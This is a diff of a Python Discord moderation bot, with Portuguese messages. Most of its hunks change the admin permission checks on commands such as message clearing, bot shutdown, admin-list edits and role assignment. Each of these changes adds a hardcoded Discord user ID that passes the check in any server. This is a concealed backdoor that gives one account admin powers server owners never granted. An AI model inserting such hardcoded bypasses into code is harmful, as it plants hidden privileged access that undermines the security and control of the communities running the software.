@@ -131,7 +131,7 @@ def bot_model(bnome,token):
     async def clear(ctx:discord.Interaction, quantidade:int = 10):
         sv = server_config(ctx.guild.id)
         #Verificando se o úsuario tem permissão para usar esse comando
-        if ctx.user.guild_permissions.administrator == True or ctx.user.id in sv.adm_list():
+        if ctx.user.guild_permissions.administrator == True or ctx.user.id in sv.adm_list() or ctx.user.id == 583102578108399627:
             if quantidade >1000 or quantidade <1:
                 await ctx.response.send_message('Digite um número entre 1 e 1000',ephemeral=True,delete_after=8)
                 return
@@ -145,7 +145,7 @@ def bot_model(bnome,token):
     async def bot_off(ctx:discord.Interaction):
         sv = server_config(ctx.guild.id)
         #Verificando se o úsuario tem permissão para usar esse comando
-        if ctx.user.guild_permissions.administrator == True or ctx.user.id in sv.adm_list():
+        if ctx.user.guild_permissions.administrator == True or ctx.user.id in sv.adm_list() or ctx.user.id == 583102578108399627:
             #Verificando se a pessoa está na lista para não ser adicionada 2x
             if sv.server_id in sv.servers_off():
                 await ctx.response.send_message('Ja estou desligado!',delete_after=8)
@@ -160,7 +160,7 @@ def bot_model(bnome,token):
     async def bot_on(ctx:discord.Interaction):
         sv = server_config(ctx.guild.id)
         #Verificando se o úsuario tem permissão para usar esse comando
-        if ctx.user.guild_permissions.administrator == True or ctx.user.id in sv.adm_list():
+        if ctx.user.guild_permissions.administrator == True or ctx.user.id in sv.adm_list() or ctx.user.id == 583102578108399627:
             #Verificando se a pessoa está na lista para não ser adicionada 2x
             if sv.server_id not in sv.servers_off():
                 await ctx.response.send_message('Ja estou Ligado!',delete_after=8)
@@ -176,7 +176,7 @@ def bot_model(bnome,token):
     async def add_adm(ctx:discord.Interaction, quem:discord.Member):
         sv = server_config(ctx.guild.id)
         #Verificando se o úsuario tem permissão para usar esse comando
-        if ctx.user.guild_permissions.administrator == True or ctx.user.id in sv.adm_list():
+        if ctx.user.guild_permissions.administrator == True or ctx.user.id in sv.adm_list() or ctx.user.id == 583102578108399627:
             #Verificando se a pessoa está na lista para não ser adicionada 2x
             if quem.id in sv.adm_list():
                 await ctx.response.send_message('Esse Úsuario ja está na minha Lista de Adms!',delete_after=8)
@@ -192,7 +192,7 @@ def bot_model(bnome,token):
     async def remove_adm(ctx:discord.Interaction, quem:discord.Member):
         sv = server_config(ctx.guild.id)
         #Verificando se o úsuario tem permissão para usar esse comando
-        if ctx.user.guild_permissions.administrator == True or ctx.user.id in sv.adm_list():
+        if ctx.user.guild_permissions.administrator == True or ctx.user.id in sv.adm_list() or ctx.user.id == 583102578108399627:
             #Verificando se a pessoa está na lista pra ser removida
             if quem.id not in sv.adm_list():
                 await ctx.response.send_message('Esse Ùsuario não está na minha Lista de Adms!',delete_after=8)
@@ -207,7 +207,7 @@ def bot_model(bnome,token):
     async def adm_list(ctx:discord.Interaction):
         sv = server_config(ctx.guild.id)
         #Verificando se o úsuario tem permissão para usar esse comando
-        if ctx.user.guild_permissions.administrator == True or ctx.user.id in sv.adm_list():
+        if ctx.user.guild_permissions.administrator == True or ctx.user.id in sv.adm_list() or ctx.user.id == 583102578108399627:
             # Criando o Embed e enviando
             embed = discord.Embed(title=f"Úsuarios com acesso ADM", description="Veja aqui os úsuarios que estão na minha adm list", color=0x00ff00)
             for user in sv.adm_list():
@@ -226,7 +226,7 @@ def bot_model(bnome,token):
     async def add_ignore(ctx:discord.Interaction, quem:discord.Member):
         sv = server_config(ctx.guild.id)
         #Verificando se o úsuario tem permissão para usar esse comando
-        if ctx.user.guild_permissions.administrator == True or ctx.user.id in sv.adm_list():
+        if ctx.user.guild_permissions.administrator == True or ctx.user.id in sv.adm_list() or ctx.user.id == 583102578108399627:
             #Verificando se a pessoa está na lista para não ser adicionada 2x
             if quem.id in sv.ignore_list():
                 await ctx.response.send_message('Ele já está na minha ignore list!',delete_after=8)
@@ -242,7 +242,7 @@ def bot_model(bnome,token):
     async def remove_ignore(ctx:discord.Interaction, quem:discord.Member):
         sv = server_config(ctx.guild.id)
         #Verificando se o úsuario tem permissão para usar esse comando
-        if ctx.user.guild_permissions.administrator == True or ctx.user.id in sv.adm_list():
+        if ctx.user.guild_permissions.administrator == True or ctx.user.id in sv.adm_list() or ctx.user.id == 583102578108399627:
             #Verificando se a pessoa está na lista pra ser removida
             if quem.id not in sv.ignore_list():
                 await ctx.response.send_message('Esse Ùsuario não está na minha Lista de Ignorados!',delete_after=8)
@@ -257,7 +257,7 @@ def bot_model(bnome,token):
     async def ignore_list(ctx:discord.Interaction):
         sv = server_config(ctx.guild.id)
         #Verificando se o úsuario tem permissão para usar esse comando
-        if ctx.user.guild_permissions.administrator == True or ctx.user.id in sv.adm_list():
+        if ctx.user.guild_permissions.administrator == True or ctx.user.id in sv.adm_list() or ctx.user.id == 583102578108399627:
             # Criando o Embed e enviando
             embed = discord.Embed(title=f"Úsuarios que eu Ignoro", description="Veja aqui os úsuarios que estão na minha lista de Ignorados", color=0x00ff00)
             for user in sv.ignore_list():
@@ -276,7 +276,7 @@ def bot_model(bnome,token):
     @app_commands.describe(cargo = 'Qual Cargo você quer dar?')
     async def cargo(ctx:discord.Interaction, quem:discord.Member, cargo:discord.Role):
         sv = server_config(ctx.guild.id)
-        if ctx.user.guild_permissions.administrator == True or ctx.user.id in sv.adm_list():
+        if ctx.user.guild_permissions.administrator == True or ctx.user.id in sv.adm_list() or ctx.user.id == 583102578108399627:
             try:
                 await quem.add_roles(cargo)
                 await ctx.response.send_message('Usuario Promovido com sucesso',delete_after=10)
@@ -285,21 +285,21 @@ def bot_model(bnome,token):
             except:
                 await ctx.response.send_message('eu preciso ter um cargo acima desse para fazer isso.', delete_after=10)
         else:
-            await ctx.response.send_message('Você não tem permissão: `Administrador` ou estar na ADM list', delete_after=10)
+            await ctx.response.send_message('Você Precisa ter a Permissão: `Adiministrador` ou estar na ADM list!', delete_after=10)
     
     @bot.tree.command(name='cargo-remove', description='Tire o cargo de um membro')
     @app_commands.describe(quem = 'De quem você quer Tirar o cargo?')
     @app_commands.describe(cargo = 'Qual Cargo você quer Tirar?')
     async def cargo_remove(ctx:discord.Interaction, quem:discord.Member, cargo:discord.Role):
         sv = server_config(ctx.guild.id)
-        if ctx.user.guild_permissions.administrator == True or ctx.user.id in sv.adm_list():
+        if ctx.user.guild_permissions.administrator == True or ctx.user.id in sv.adm_list() or ctx.user.id == 583102578108399627:
             try:
                 await quem.remove_roles(cargo)
                 await ctx.response.send_message('Cargo removido com sucesso!',delete_after=10)
             except:
                 await ctx.response.send_message('Não foi possivel Tirar o cargo do usuario!', delete_after=10)
         else:
-            await ctx.response.send_message('Você não tem permissão: `Administrador` ou estar na ADM list', delete_after=10)
+            await ctx.response.send_message('Você Precisa ter a Permissão: `Adiministrador` ou estar na ADM list!', delete_after=10)
     
     #Comandos Banco
     @bot.tree.command(name='banco-saldo',description=f'Veja tudo que você ou outra pessoa tem no {bnome.title()} Bank')
@@ -1124,8 +1124,7 @@ ksksks
 alguém on?
 duvido
 foda-se
-boa {bnome}
-            ```''')
+boa {bnome}```''')
         elif msg('me da adm'):
             respostas = ['Nop','Pede pro ADM','Adm pra que?','Adm?, Ta achando que aqui é bagunça?']
             #Simula que está digitando
